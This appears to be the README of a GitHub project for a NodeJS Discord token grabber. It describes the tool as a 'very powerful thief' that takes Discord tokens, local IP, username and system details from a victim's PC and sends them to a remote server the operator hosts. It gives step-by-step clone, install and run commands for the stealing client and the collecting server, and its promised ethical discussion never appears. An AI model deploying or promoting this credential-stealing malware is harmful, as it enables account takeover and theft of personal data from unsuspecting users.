# DiscordTokenGrabber

## Description

Grabber token created in NodeJS with characteristics of a very powerful thief, this Grabber token is designed with an API that interacts directly with the client, thus sending registration packets like all the discord tokens and other things such as local IP, username , ram info etc...

This README provides a brief overview of what a token grabber is, its potential uses, and some ethical and legal considerations.

## How Token Grabbers Work

Token grabbers work by intercepting and capturing tokens as they are transmitted between a client and a server. This interception can occur through various means, such as exploiting vulnerabilities, man-in-the-middle attacks, or through malicious software or scripts injected into a user's device.

## Install
- `git clone https://github.com/k4itrun/DiscordTokenGrabber.git`
- `cd DiscordTokenGrabber`
- `cd `
    - `cd server` --> *simply if you enter the server you can start it on localhost, but it is preferable to host it on some vps or host*

    - `cd client` --> *the client is simply the token grabber of all the tokens and all the information on the PC.*
- `npm i npm@latest && npm i` or `npm i --force`

- `node client` --> *When the client is executed it will send all the data to the* `server` *that means that you will have all the data remotely*
